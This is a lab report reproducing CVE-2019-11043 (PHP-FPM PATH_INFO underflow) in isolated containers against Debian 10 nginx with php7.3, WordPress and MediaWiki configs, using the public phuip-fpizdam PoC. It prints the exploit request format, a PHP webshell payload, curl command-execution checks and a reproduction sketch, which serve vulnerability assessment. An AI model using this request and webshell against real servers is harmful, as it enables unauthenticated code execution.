# CVE-2019-11043 on Debian 10 nginx + PHP-FPM with WordPress / MediaWiki recommended configs

- **Date:** 2026-10-23
- **Lab root:** `/tmp/opencode/research/fpm_11043_targets_20261023T085412Z`
- **Scope:** reproduce CVE-2019-11043 (PHP-FPM `PATH_INFO` underflow) against a real Debian 10 nginx + php7.3-fpm package stack, then against the official WordPress and MediaWiki recommended nginx configurations, using stock application code and the public `phuip-fpizdam` PoC.
- **Constraint compliance:** isolated containers/ports, no third-party plugins/extensions, `cgi.fix_pathinfo=1`, ASLR on, `display_errors=Off`, no application LFI, no shared lab touched, no commit/push.

---

## 1. Bottom line

1. **The stock Debian 10 PHP package is vulnerable.** `php7.3 7.3.9-1~deb10u1` (buster) was exploited end-to-end: PHP code execution as `uid=33(www-data)`, both through a WordPress front controller and through a minimal PHP probe, each behind the canonical (non-stock) nginx PHP-FPM pattern.
2. **The stock Debian 10 nginx default is not exploitable by this PoC.** With the packaged default site and the packaged `snippets/fastcgi-php.conf`, the path-info request is stopped by `try_files $fastcgi_script_name =404;` (HTTP 404); FPM never processes the poisoned request.
3. **The official WordPress recommended nginx config is not exploitable as published.** It has no `try_files` in the PHP location but also forwards no `PATH_INFO`; with `cgi.fix_pathinfo=1` the request is handled by WordPress (canonical 301 redirect) without the empty-`PATH_INFO` condition. Adding `PATH_INFO` forwarding is a non-stock change and does make the PoC detect the target.
4. **The official MediaWiki recommended nginx config is not exploitable as published.** Its PHP location is end-anchored to known entry points (`^/w/(mw-config/)?(index|load|api|thumb|opensearch_desc|rest|img_auth)\.php$`) and everything else falls through to `location / { return 404; }`; the path-info URI never reaches FPM.
5. **Fixed controls are clean.** Debian `php7.3 7.3.11-1~deb10u1`, upstream PHP 7.2.24 and upstream PHP 8.4.26 returned “no qsl candidates found, invulnerable” with a base status of 200 on a plain PHP probe. No `uid=` marker and no `/tmp/a` payload appeared.
6. **Conclusion:** CVE-2019-11043 is a PHP-FPM vulnerability, but with this PoC its exploitability is **configuration-dependent**. A stock Debian 10 PHP 7.3.9 package is vulnerable; the stock distro nginx default and the two official application configs tested here are **not** exploitable without non-stock changes (explicit `PATH_INFO` forwarding and removal/absence of a file-existence check).

---

## 2. Classification used in this report

| Label | Meaning |
|---|---|
| **Stock distro default** | Files shipped by Debian 10 packages (`nginx-full 1.14.2-2+deb10u4`, `snippets/fastcgi-php.conf`). The only edit in the “PHP enabled” variant is uncommenting the PHP block exactly as shipped. |
| **Common app config** | The nginx configuration published by the application project (WordPress developer docs / MediaWiki manual), with only host/port/FPM-upstream substitutions. |
| **Non-stock** | Any change not present in the distro package or the application manual: explicit `PATH_INFO` forwarding, `try_files` removal/reordering, `cgi.fix_pathinfo=0`, or the generic PHP documentation/canonical reproducer pattern. |

Results are reported separately as:

- **RCE** – PoC printed `Success!` and `?a=id` returned `uid=33(www-data)`.
- **Detected** – PoC found QSL candidates / `502` anomalies (probable vulnerability) but a full RCE run was not performed.
- **Blocked** – PoC returned `no qsl candidates found, invulnerable or something wrong` (or the request never reached FPM).

---

## 3. Environment

### 3.1 Host

```
Linux opencode-vm 6.12.113+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.113-1 (2026-10-15) x86_64
/proc/sys/kernel/randomize_va_space = 2   (ASLR on)
```

### 3.2 Packages and images

| Component | Exact version | Provenance | Class |
|---|---|---|---|
| Debian | 10.13 (buster, final point release) | `debian:buster`, `archive.debian.org` | stock |
| nginx | `1.14.2-2+deb10u4` (`nginx-full`, `nginx-common`) | Debian buster + buster/updates | stock |
| PHP-FPM vulnerable | `php7.3 7.3.9-1~deb10u1` (fpm/cli/common/opcache/mysql/xml/mbstring/json/sqlite3/readline) | `snapshot.debian.org` 2019-10-20, installed with `dpkg`/`apt` | stock Debian package |
| PHP-FPM fixed control | `php7.3 7.3.11-1~deb10u1` | `snapshot.debian.org` 2019-11-20, same package set | stock Debian package |
| PHP exact 7.3.10 | `PHP 7.3.10 (cli/fpm) (built: Oct 24 2019)` | `php:7.3.10-fpm` official image | non-stock (upstream image) |
| PHP exact 7.2.23 | `PHP 7.2.23` | `php:7.2.23-fpm` official image | non-stock (upstream image) |
| PHP fixed control 7.2.24 | `PHP 7.2.24` | `php:7.2.24-fpm` official image | non-stock (upstream image) |
| PHP fixed control 8.4.26 | `PHP 8.4.26 (NTS)` | `php:8.4.26-fpm` official image | non-stock (upstream image) |
| Database | MariaDB `11.4.13-MariaDB` | `mariadb:11.4` | support service |
| WordPress | `5.3.2` (`$wp_version = '5.3.2'`) | `wordpress-5.3.2.tar.gz` | stock app |
| MediaWiki | `1.33.1` (`$wgVersion = '1.33.1'`) | `mediawiki-1.33.1.tar.gz` | stock app |

Image digests (from `docker inspect`):

```
t11043-nginx       sha256:db016b3b986c01debe1be86e567d382976ebd8d7ac8eda655f509bb03e376d35
t11043-fpm739      sha256:bfa5c3cca696af50bae44cda65ceeba52643a5500b31f108829f782d3e324b59
t11043-fpm7311     sha256:93f09fda9e505ec6afb77d3e8b4f4b40c0db5ad9259952eca9ec02d5ec151689
t11043-fpm7310     sha256:447244af134898237592a1a6de3559be17179c1b0e54bb0c5223c546d720668d
t11043-fpm7223     sha256:1514e482b16ab6f9189b8659a0fa59807580c9ab91e92bfab4b104d992d6a51a
t11043-fpm7224     sha256:48432d192e1ad18daabf3c7ad31852801f9c24606b18bda6574c29db92ec3358
t11043-fpm8426     sha256:9f0837de65e3c405aca0d0c00a1a54d0fce759d2d08f2742387c1ed4a711283b
t11043-db          sha256:823a099a93df6416c6c7ed33c79a2d43e92ffbd2ccc0e83973ef045f2dae1ac0
```

Key artifact hashes:

```
4288de5256d575440ef9185d8c923d978ab4f7925c03dac8233340ed67d932dc  phuip-fpizdam (commit 86bc456bd5d53c77ad54a2252dcaaf1345b1a483, 2019-11-12)
e186687e82a154da187dce888c016284e2afe9eb3088e3f365db811e06910167  wordpress-5.3.2.tar.gz
7d97a4cd85bfeb85b69870ffaab35fc5288e69e45cb7edea65d089f7f406a1a7  mediawiki-1.33.1.tar.gz
2c3c01c1b1f0c455044a0577b27a693c87f5dc1f3d9f40d64bb3f9b68b790831  php7.3-fpm_7.3.9-1~deb10u1_amd64.deb
1d8214d8646190bf568b1f18267641ef26ca496d6126472bb20edab7adecc3cd  php7.3-fpm_7.3.11-1~deb10u1_amd64.deb
8414bd93b6cb0791ac91fb41a765fe82cf83e6559bad92da65999157bfa880c0  conf/nginx/t11043.conf
eda866ff4373ffd00418da89bbfefb48915581f3028eda7c76d7c7e0eb11ee12  apps/w/LocalSettings.php
```

`nginx -V` (packaged build):

```
nginx version: nginx/1.14.2
built with OpenSSL 1.1.1d
configure arguments: ... --with-debug --with-pcre-jit ... (Debian 1.14.2-2+deb10u4 build)
```

### 3.3 Debian 10 version note

Debian 10 (buster) shipped the vulnerable PHP 7.3 line as **`7.3.9-1~deb10u1`** and fixed it with **`7.3.11-1~deb10u1`**. `7.3.10-1` was not available as a buster package during this work, so exact upstream 7.3.10 was tested with the official `php:7.3.10-fpm` image and is labelled non-stock. Likewise, Ubuntu 18.04 never published php7.2 7.2.23, so 7.2.23/7.2.24 were tested with the official upstream images.

---

## 4. Configurations under test

All vhosts are generated verbatim from the packaged files or the published application docs; the generator is `conf/gen_nginx.py` and the full runtime config is `conf/nginx/t11043.conf` (sha256 `8414bd93…`).

### 4.1 Debian 10 stock default site and stock snippet

`/etc/nginx/sites-available/default` (packaged `nginx-common 1.14.2-2+deb10u4`), PHP block as shipped:

```nginx
root /var/www/html;
index index.html index.htm index.nginx-debian.html;
server_name _;

location / {
    try_files $uri $uri/ =404;
}

#location ~ \.php$ {
#   include snippets/fastcgi-php.conf;
#   fastcgi_pass unix:/run/php/php7.3-fpm.sock;
#}
```

“PHP enabled” variant: the PHP block is uncommented exactly as above, with only `fastcgi_pass` changed to the lab upstream. For the WordPress test the stock `root /var/www/html` points at the stock WordPress 5.3.2 tree (bind mount); for the MediaWiki test it points at the stock MediaWiki 1.33.1 tree. No other vhost directive was changed.

`/etc/nginx/snippets/fastcgi-php.conf` (stock, complete):

```nginx
# regex to split $uri to $fastcgi_script_name and $fastcgi_path
fastcgi_split_path_info ^(.+?\.php)(/.*)$;

# Check that the PHP script exists before passing it
try_files $fastcgi_script_name =404;

# Bypass the fact that try_files resets $fastcgi_path_info
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;

fastcgi_index index.php;
include fastcgi.conf;
```

`/etc/nginx/fastcgi.conf` (stock; relevant lines):

```nginx
fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING     $query_string;
...
fastcgi_param  SCRIPT_NAME      $fastcgi_script_name;
fastcgi_param  REQUEST_URI      $request_uri;
fastcgi_param  DOCUMENT_URI     $document_uri;
fastcgi_param  DOCUMENT_ROOT    $document_root;
...
```

Note: `fastcgi.conf` does **not** define `PATH_INFO`.

### 4.2 WordPress recommended nginx config (official)

Source: `https://developer.wordpress.org/advanced-administration/server/web-server/nginx/` (captured `research/wp_nginx_doc.html`, sha256 `11b104b0…`). The published vhost contains:

```nginx
server {
    server_name domain.tld;
    root /var/www/wordpress;
    index index.php;

    location = /favicon.ico { log_not_found off; access_log off; }
    location = /robots.txt  { allow all; log_not_found off; access_log off; }

    location / {
        try_files $uri $uri/ /index.php?$args;
    }

    location ~ \.php$ {
        #NOTE: You should have "cgi.fix_pathinfo = 0;" in php.ini
        include fastcgi.conf;
        fastcgi_intercept_errors on;
        fastcgi_pass php;
    }

    location ~* \.(js|css|png|jpg|jpeg|gif|ico)$ { expires max; log_not_found off; }
}
```

The only changes in the lab are `server_name _;` and `fastcgi_pass` to the lab FPM upstream. The doc itself recommends `cgi.fix_pathinfo = 0`; the lab deliberately used `1` (task requirement), i.e. the attacker-favourable setting.

### 4.3 MediaWiki recommended nginx config (official)

Source: `https://www.mediawiki.org/wiki/Manual:Short_URL/Nginx` (captured `research/mw_Manual_Short_URL_Nginx.html`, sha256 `8da2e363…`, page oldid 8060723). Core block:

```nginx
server {
    root /var/www;

    location ~ ^/w/(mw-config/)?(index|load|api|thumb|opensearch_desc|rest|img_auth)\.php$ {
        include /etc/nginx/fastcgi_params;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        fastcgi_pass 127.0.0.1:9000;
    }

    location /w/images { ... }
    location /w/images/deleted { deny all; }
    location ~ ^/w/resources/(assets|lib|src) { try_files $uri =404; ... }
    location ~ ^/w/(skins|extensions)/.+\.(css|js|gif|jpg|jpeg|png|svg|wasm|ttf|woff|woff2)$ { ... }
    location = /favicon.ico { alias /w/images/6/64/Favicon.ico; ... }
    location ~ ^/w/(COPYING|CREDITS)$ { default_type text/plain; }
    location /w/rest.php/ { try_files $uri $uri/ /w/rest.php?$query_string; }
    location /wiki/ { rewrite ^/wiki/(?<pagename>.*)$ /w/index.php; }
    location = /robots.txt { }
    location = / { return 301 /wiki/Main_Page; }
    location / { return 404; }
}
```

MediaWiki `LocalSettings.php` follows the manual’s short-URL settings:

```php
$wgScriptPath  = "/w";
$wgArticlePath = "/wiki/$1";
$wgUsePathInfo = true;
```

(`$wgServer` is auto-detected per request so the same wiki can answer on the lab ports.)

### 4.4 Non-stock canonical PHP-FPM pattern

The pattern used by the public PoC/README and generic PHP-FPM examples, with **no** `try_files` and with `PATH_INFO` forwarded:

```nginx
location ~ [^/]\.php(/|$) {
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
    include fastcgi_params;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_param PATH_INFO $fastcgi_path_info;
    fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info;
    fastcgi_pass t11043-fpm739;
    fastcgi_index index.php;
}
```

### 4.5 PHP-FPM pool / ini (Debian 10, 7.3.9)

`/etc/php/7.3/fpm/pool.d/www.conf`:

```ini
[www]
user = www-data
group = www-data
listen = 9000
pm = dynamic
pm.max_children = 5
pm.start_servers = 2
pm.min_spare_servers = 1
pm.max_spare_servers = 3
```

`/etc/php/7.3/fpm/php.ini` relevant values (runtime from `php-fpm7.3 -i`):

```
cgi.fix_pathinfo => 1 => 1
display_errors   => Off => Off
expose_php       => Off => Off
log_errors       => On
```

The distro `php.ini` has `;cgi.fix_pathinfo=1` commented out (PHP default is 1); the lab also sets it explicitly in `/etc/php/7.3/fpm/conf.d/99-t11043.ini`:

```ini
cgi.fix_pathinfo=1
display_errors=Off
log_errors=On
error_log=/var/log/php-fpm-error.log
expose_php=Off
memory_limit=128M
```

The same runtime values were verified on 7.3.11, 7.3.10, 7.2.23, 7.2.24 and 8.4.26 (`evidence/configs/fix_pathinfo_all.txt`, `evidence/configs/display_errors_upstream.txt`).

### 4.6 Lab plumbing deviations (not security-relevant)

- FPM pools listen on TCP `9000` inside the container network instead of a Unix socket; `listen.allowed_clients` is disabled because nginx is a separate container.
- `/run/php` is created at container start; `fastcgi_pass` uses named Docker upstreams.
- WordPress `WP_HOME`/`WP_SITEURL` derive from `$_SERVER['HTTP_HOST']` so one docroot works on several lab ports.
- MediaWiki is installed with SQLite; WordPress uses MariaDB 11.4 (`t11043-db`, db `wp`, user `wp`).

No application LFI, no upload/write primitive, no third-party plugin/extension was used. Only the bundled WordPress plugins (`akismet`, `hello.php`) and bundled MediaWiki extensions are present, all inactive by default. The only file written during exploitation is the PoC’s own `/tmp/a` payload, created *after* FPM code execution; it is not a pre-existing application write primitive and is not used to seed the bug.

---

## 5. Public PoC and request format

- Repository: `https://github.com/neex/phuip-fpizdam`
- Commit: `86bc456bd5d53c77ad54a2252dcaaf1345b1a483` (2019-11-12)
- Binary sha256: `4288de5256d575440ef9185d8c923d978ab4f7925c03dac8233340ed67d932dc`
- Invocation: `./phuip-fpizdam [--only-qsl] [--qsl N --pisos N --skip-detect] http://host:port/index.php`

The PoC’s request (from `requester.go` and `consts.go`):

```http
GET /index.php/PHP%0Ais_the_shittiest_lang.php?QQQQ... HTTP/1.1
Host: 127.0.0.1:PORT
User-Agent: Mozilla/5.0
D-Pisos: 8=====...=====D
Ebut: mamku tvoyu
```

- `BreakingPayload = "/PHP\nis_the_shittiest_lang.php"`; the newline is sent as `%0A`.
- `D-Pisos` is `8`, then `PisosLength` `=` characters, then `D`.
- The query string is `QueryStringLength` characters of `Q` (the PoC subtracts a 1-byte delta for the `%0A` encoding, so qsl 1750 sends 1749 `Q`s).
- `Ebut: mamku tvoyu` is a fixed marker header.
- All exploit requests are `GET` with an **empty body**; the attack state is carried in the URL path/query and headers, not in a POST body.

The exact request/response capture is in `evidence/request_example.txt`. On an unpoisoned WordPress target the base response is the WordPress canonical `301` (the PoC treats that as the base and looks for `502` anomalies).

Success was verified independently of the app:

```bash
curl -s 'http://127.0.0.1:<port>/?a=id'      # or /index.php?a=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The PoC also writes a payload `/tmp/a`:

```php
<?php echo `$_GET[a]`;return;?>
```

Presence of `/tmp/a` in the FPM container and a `uid=` response are the RCE markers used below.

---

## 6. Results

### 6.1 Main matrix (QSL detection)

Ports: slot 1 = stock snippet + WP docroot, 2 = WordPress recommended, 3 = MediaWiki recommended, 4 = stock snippet + MW docroot, 5 = WordPress recommended + `PATH_INFO` (non-stock), 7 = canonical fpm-docs + WP, 8 = canonical fpm-docs + MW.

| PHP | Class | Stock snippet WP | WP recommended | MW recommended | WP rec + PATH_INFO (non-stock) | fpm-docs WP (non-stock) | fpm-docs MW (non-stock) |
|---|---|---|---|---|---|---|---|
| **7.3.9-1~deb10u1** (Debian 10) | stock Debian pkg | Blocked (404) | Blocked (301/WP) | Blocked (404) | Detected | **RCE** | **RCE** |
| **7.3.10** (upstream image) | non-stock | Blocked | Blocked | Blocked | Detected | **RCE** | Detected |
| **7.2.23** (upstream image) | non-stock | Blocked | Blocked | Blocked | Detected | **RCE** | Detected |
| **7.3.11-1~deb10u1** (Debian 10) | fixed control | Blocked | Blocked | Blocked | Blocked | Blocked | Blocked |
| **7.2.24** (upstream image) | fixed control | Blocked | Blocked | Blocked | Blocked | Blocked | Blocked |
| **8.4.26** (upstream image) | fixed control | Blocked | Blocked | Blocked | Blocked | Blocked | Blocked |

“Blocked” = `no qsl candidates found, invulnerable or something wrong`. “Detected” = `Attack params found` / `found QSLs`. “RCE” = `Success!` plus `uid=33(www-data)`.

Evidence: `logs/matrix_qsl/<php>_<cell>.txt`, summarized in `evidence/matrix_summary.txt`.

Representative blocked logs:

```
7.3.9_stock-snippet-WP:    Base status code is 404
                           Detect() returned error: no qsl candidates found, invulnerable or something wrong
7.3.9_wordpress-recommended: Base status code is 301
                           Detect() returned error: no qsl candidates found, invulnerable or something wrong
7.3.9_mediawiki-recommended: Base status code is 404
                           Detect() returned error: no qsl candidates found, invulnerable or something wrong
final (UsePathInfo=true):  Base status code is 404 / no qsl candidates (logs/final_mw_rec_usepathinfo_true.txt)
7.3.11_fpm-docs-WP:        Base status code is 301
                           Detect() returned error: no qsl candidates found, invulnerable or something wrong
```

### 6.2 RCE evidence

| Target | PHP | Config | QSL | Pisos | Marker | Log / body |
|---|---|---|---|---|---|---|
| `19107 /index.php` | 7.3.9-1~deb10u1 | fpm-docs WP (non-stock) | 1750 | 64 | `uid=33(www-data)` | `logs/clean_attack_739_wp.txt`, `evidence/clean_rce_739_wp_id.txt` |
| `19108 /index.php` | 7.3.9-1~deb10u1 | fpm-docs MW (non-stock) | 1760 | 216 | `uid=33(www-data)` | `logs/final_attack_739_mw_usepathinfo_true.txt`, `evidence/final_rce_739_mw_id.txt` |
| `19107 /ctrl11043.php` | 7.3.9-1~deb10u1 | fpm-docs + plain PHP probe | 1745 | 212 | `uid=33(www-data)` + `CTRL11043 7.3.9-1~deb10u1` | `logs/vuln_7.3.9_pure_ctrl.txt`, `evidence/pure_ctrl_rce_739_id.txt` |
| `19117 /index.php` | 7.3.10 upstream | fpm-docs WP | 1750 | 64 | `uid=33(www-data)` | `logs/attack_7.3.10_WP.txt`, `evidence/rce_7.3.10_WP_id_body.html` |
| `19137 /index.php` | 7.2.23 upstream | fpm-docs WP | 1750 | 240 | `uid=33(www-data)` | `logs/attack_7.2.23_WP.txt`, `evidence/rce_7.2.23_WP_id_body.html` |

Raw response excerpt (7.3.9, WordPress front controller):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<!DOCTYPE html>
<html class="no-js" lang="en-US">
...
<meta name="generator" content="WordPress 5.3.2" />
```

Raw response excerpt (7.3.9, MediaWiki front controller):

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<!DOCTYPE html>
<html class="client-nojs" lang="en" dir="ltr">
<head>
<meta charset="UTF-8"/>
```

`/tmp/a` payload presence:

```
t11043-fpm739:  -rw-r--r-- 1 www-data www-data 834 Oct 23 09:35 /tmp/a
t11043-fpm7310: -rw-r--r-- 1 www-data www-data 1592 Oct 23 09:22 /tmp/a
t11043-fpm7223: -rw-r--r-- 1 www-data www-data 1592 Oct 23 09:22 /tmp/a
t11043-fpm7311: absent
t11043-fpm7224: absent
t11043-fpm8426: absent
```

The 7.3.9 WP and MW RCE runs were repeated after `docker restart t11043-fpm739` so that each proof started from a clean FPM pool (the vhosts share the pool; restart avoids cross-vhost contamination).

### 6.3 Fixed controls

Full PoC runs against the plain PHP probe (`ctrl11043.php`, base status 200) behind the same canonical fpm-docs pattern:

| PHP | Probe response | PoC result |
|---|---|---|
| 7.3.11-1~deb10u1 | `CTRL11043 7.3.11-1~deb10u1` | `no qsl candidates found, invulnerable or something wrong` |
| 7.2.24 | `CTRL11043 7.2.24` | `no qsl candidates found, invulnerable or something wrong` |
| 8.4.26 | `CTRL11043 8.4.26` | `no qsl candidates found, invulnerable or something wrong` |

Logs: `logs/fixed_7.3.11_pure_ctrl.txt`, `logs/fixed_7.2.24_pure_ctrl.txt`, `logs/fixed_8.4.26_pure_ctrl.txt`. The probe was removed after the runs; its sha256 is in `evidence/ctrl_probe_sha256.txt`.

`?a=id` on the fixed app vhosts never returned a `uid=` line and `/tmp/a` remained absent. This rules out the fixed-version results being caused by a missing route or a dead FPM pool.

### 6.4 Blocked-request evidence

| Request | Target | Response | Reason visible in config/HTTP |
|---|---|---|---|
| `/index.php/PHP%0Ais_the_shittiest_lang.php?<1749 Q>` | `19101` stock snippet + WP | `404 Not Found` (`nginx/1.14.2`) | `try_files $fastcgi_script_name =404;` — the newline defeats `fastcgi_split_path_info`, so the file test uses the unsplit path and fails |
| same | `19103` MW recommended | `404 Not Found` | `location / { return 404; }`; the end-anchored PHP location does not match the path-info URI |
| same | `19102` WP recommended | `301 Moved Permanently`, `X-Redirect-By: WordPress` | request reaches FPM/WordPress, but no empty `PATH_INFO` is forwarded; WordPress handles it and redirects |
| same | `19173` stock snippet + `try_files`, PATH_INFO reordered (non-stock) | `404 Not Found` | `try_files` still rejects the unsplit script name |

Captures: `evidence/http_blocked_headers.txt`, `evidence/errorlog_blockers.txt`. The 301 from WordPress is itself evidence that the request reached the application rather than being dropped by nginx.

---

## 7. Config-delta experiments (all non-stock)

| Delta | PHP | Result | Log |
|---|---|---|---|
| Stock snippet minus `try_files` (original PATH_INFO position) | 7.3.9 | Blocked | `logs/delta_7.3.9_stock_snippet_minus_tryfiles.txt` |
| Stock snippet minus `try_files`, PATH_INFO moved after `include fastcgi.conf` | 7.3.9 | Detected (QSL 1755/1760/1765) | `logs/delta_7.3.9_stock_no_tryfiles_reordered.txt` |
| Same, full attack | 7.3.9 | Not confirmed: PoC sanity check got 404 (expected 301) | `logs/clean_attack_739_delta_notryfiles_retry.txt` |
| Stock snippet **with** `try_files`, PATH_INFO moved after `include fastcgi.conf` | 7.3.9 | Blocked | `logs/delta_7.3.9_stock_reordered_with_tryfiles.txt` |
| Same deltas | 7.3.11 | All blocked | `logs/delta_7.3.11_*.txt` |
| MediaWiki recommended + `PATH_INFO` forwarding | 7.3.9 / 7.3.11 | Blocked / Blocked | `logs/delta_7.3.9_mw_rec_plus_PATHINFO.txt`, `logs/delta_7.3.11_mw_rec_plus_PATHINFO.txt` |
| Canonical pattern with `cgi.fix_pathinfo=0` | 7.3.9 | Blocked | `logs/delta_7.3.9_docs_fixpathinfo0.txt` |

Interpretation:

- Removing `try_files` alone is not sufficient for the packaged snippet in this PoC; the variant that also moved `PATH_INFO` after `include fastcgi.conf` produced QSL candidates. The full attack on that variant failed the PoC’s own `301` sanity check (WordPress returned a 404 page), so it is reported as **detected, not RCE-confirmed**.
- Adding `PATH_INFO` to the MediaWiki recommended vhost does **not** help, because the URI never matches the PHP location in the first place.
- `cgi.fix_pathinfo=0` blocks the PoC even on the otherwise-vulnerable canonical pattern, confirming it is a real precondition for this exploitation path.

---

## 8. Why each stock/common config behaves as it does

### 8.1 Debian 10 stock snippet: `try_files` is the gate

The snippet splits the URI with `fastcgi_split_path_info ^(.+?\.php)(/.*)$`. The PoC sends a literal newline (`%0A`) after `/index.php`; PCRE’s `.` does not match a newline by default, so the split fails and `$fastcgi_script_name` remains the full unsplit string (`/index.php/PHP\nis_the_shittiest_lang.php`). `try_files $fastcgi_script_name =404;` then tests that non-existent file and returns 404 before FPM is contacted. This is the measured 404 on ports 19101/19173. Even if the file check is removed, the variant measured here still did not produce a confirmed RCE unless `PATH_INFO` was also moved after `include fastcgi.conf`; the exact ordering effect is recorded as measured, not inferred.

### 8.2 WordPress recommended: no explicit empty `PATH_INFO`

The WP location has no `fastcgi_split_path_info` and no `PATH_INFO` parameter. With `cgi.fix_pathinfo=1`, FPM derives path info from `SCRIPT_FILENAME` (which contains the newline), so `PATH_INFO` is not the empty value the PoC needs. WordPress receives the request and answers with its canonical 301 (`X-Redirect-By: WordPress`), not a crash. Adding `fastcgi_param PATH_INFO $fastcgi_path_info;` plus `fastcgi_split_path_info` (non-stock) makes the split fail and forwards an empty `PATH_INFO`, which is why the same PHP version is detected as vulnerable on port 19105.

The WordPress documentation itself recommends `cgi.fix_pathinfo = 0`; the lab used `1`, the weaker setting, and the config was still not exploitable as published.

### 8.3 MediaWiki recommended: URI never reaches the PHP location

The PHP location is end-anchored:

```nginx
location ~ ^/w/(mw-config/)?(index|load|api|thumb|opensearch_desc|rest|img_auth)\.php$ { ... }
```

`/w/index.php/PHP%0A...` does not end at `.php`, so the location does not match; the final `location / { return 404; }` handles it. Adding `PATH_INFO` to the PHP location cannot change that. This is a routing-level block, independent of the PHP version.

### 8.4 Canonical fpm-docs pattern: vulnerable path

`location ~ [^/]\.php(/|$)` matches the path-info URI; `fastcgi_split_path_info` fails on the newline, leaving `$fastcgi_path_info` empty; `fastcgi_param PATH_INFO $fastcgi_path_info` forwards an empty `PATH_INFO`; there is no `try_files`. Under PHP 7.3.9/7.3.10/7.2.23 this is sufficient for the PoC to corrupt FPM and execute commands. Under 7.3.11/7.2.24/8.4.26 the same request is rejected/does not produce QSL candidates.

---

## 9. Conclusion

**Stock vs config-dependent:**

- **PHP package:** Stock Debian 10 `php7.3 7.3.9-1~deb10u1` is genuinely vulnerable; unauthenticated RCE as `www-data` was demonstrated with the public PoC and a plain PHP endpoint.
- **Distro nginx default:** Not exploitable as shipped with the PHP block enabled. The packaged `fastcgi-php.conf` `try_files` check stops the path-info request before FPM (404). No QSL candidates, no crash, no RCE.
- **WordPress recommended config:** Not exploitable as published, even with the attacker-favourable `cgi.fix_pathinfo=1`. The request reaches WordPress (301) but the empty-`PATH_INFO` condition is not met. It becomes detectable only after the non-stock addition of `PATH_INFO` forwarding.
- **MediaWiki recommended config:** Not exploitable as published. The end-anchored PHP location plus `location / { return 404; }` prevents the path-info URI from reaching FPM; adding `PATH_INFO` does not change this.
- **Fixed versions:** 7.3.11-1~deb10u1, 7.2.24 and 8.4.26 are clean on the same canonical config with a base-200 plain PHP probe.

Therefore, for this deployment family the accurate statement is: **the PHP-FPM package is vulnerable, but exploitation through nginx is configuration-dependent**. The stock distro default and the two official application configurations tested here are not exploitable with `phuip-fpizdam` without non-stock changes.

---

## 10. Limitations

1. Debian 10 never shipped `7.3.10-1` for buster; the stock vulnerable package is `7.3.9-1~deb10u1`, and exact 7.3.10 was tested only via the official upstream image (labelled non-stock).
2. Ubuntu 18.04 php7.2 never published `7.2.23`; 7.2.23/7.2.24 were tested with official upstream images (labelled non-stock).
3. The official `php:7.2.23-fpm`/`7.2.24-fpm` images lack the `mysqli`/`mysql` extensions used by WordPress 5.3.2, so the WP front controller returns 500 on those images. RCE and fixed-control checks were therefore also performed with a plain PHP probe on the same canonical config; the `uid=` marker is independent of WordPress.
4. QSL detection is probabilistic and can depend on which FPM worker receives the request; every RCE claim is backed by a full attack plus an independent `?a=id` response and `/tmp/a` presence.
5. The FPM pool is shared by all vhosts of one PHP version. WP and MW RCE reruns were separated by `docker restart t11043-fpm739` to avoid cross-vhost contamination; the clean rerun logs are the ones cited in §6.2.
6. Container clocks drifted during the session; log timestamps are as recorded by the containers and are not used as a strict chronology.

---

## 11. Evidence index

| Path | Contents |
|---|---|
| `evidence/versions.txt` | `nginx -v`, `dpkg-query` versions, `php -v`, image digests, ASLR |
| `evidence/nginx_build.txt` | `nginx -V` packaged build flags |
| `evidence/hashes.txt` | deb / PoC / image hashes |
| `evidence/app_versions.txt` | WP 5.3.2, MW 1.33.1, front-controller hashes |
| `evidence/app_archive_hashes.txt` | official archive sha256 + member hash comparison |
| `evidence/configs/nginx_packaged_files.txt` | Debian default site, `fastcgi-php.conf`, `fastcgi.conf`, `fastcgi_params` |
| `evidence/configs/nginx_full_runtime.conf` | `nginx -T` of the lab |
| `evidence/configs/php_fpm_ini_pool.txt` | pool `www.conf`, php.ini values, runtime `fix_pathinfo` |
| `evidence/configs/fix_pathinfo_all.txt` | `cgi.fix_pathinfo` for every PHP version |
| `evidence/configs/fix_pathinfo_upstream.txt` | same, upstream images |
| `evidence/configs/display_errors_upstream.txt` | `display_errors=Off`, `expose_php=Off` |
| `evidence/http_blocked_headers.txt` | raw HTTP responses for blocked cells |
| `evidence/errorlog_blockers.txt` | nginx error log for the blocked requests |
| `evidence/request_example.txt` | exact PoC request line/headers |
| `evidence/matrix_summary.txt` | one-line status for every matrix cell |
| `evidence/delta_summary.txt` | one-line status for every delta |
| `evidence/clean_rce_739_wp_id.txt`, `evidence/final_rce_739_mw_id.txt`, `evidence/pure_ctrl_rce_739_id.txt` | `uid=33(www-data)` responses |
| `evidence/rce_7.3.10_WP_id_body.html`, `evidence/rce_7.2.23_WP_id_body.html` | upstream-version RCE bodies |
| `evidence/fpm_crash_markers.txt` | grep for SIGSEGV/zend_mm markers (none) |
| `evidence/MANIFEST.sha256` | sha256 of all evidence/log/config artifacts |
| `logs/matrix_qsl/*.txt` | full QSL detection logs per cell |
| `logs/attack_*.txt`, `logs/clean_attack_*.txt`, `logs/final_attack_*.txt` | full attack logs |
| `logs/fixed_*_pure_ctrl.txt` | fixed-version pure-probe controls |
| `logs/final_mw_rec_usepathinfo_true.txt` | MediaWiki recommended vhost recheck with `$wgUsePathInfo = true` (404, no candidates) |
| `logs/delta_*.txt` | delta experiments |
| `conf/nginx/t11043.conf` | generated vhosts (49 server blocks) |

### Reproduction sketch

```bash
# rebuild the package stacks
docker build -t t11043/nginx-deb10:1   stacks/nginx-deb10
docker build -t t11043/php739-deb10:1  stacks/php73-739
docker build -t t11043/php7311-deb10:1 stacks/php73-7311

# start FPM + nginx (see conf/run_nginx.sh; all ports bound to 127.0.0.1)
bash conf/run_nginx.sh

# vulnerable cell (7.3.9, canonical pattern)
./poc/phuip-fpizdam/phuip-fpizdam 'http://127.0.0.1:19107/index.php'
curl -s 'http://127.0.0.1:19107/?a=id'

# stock snippet / WP rec / MW rec cells (expect no QSL candidates)
./poc/phuip-fpizdam/phuip-fpizdam 'http://127.0.0.1:19101/index.php'
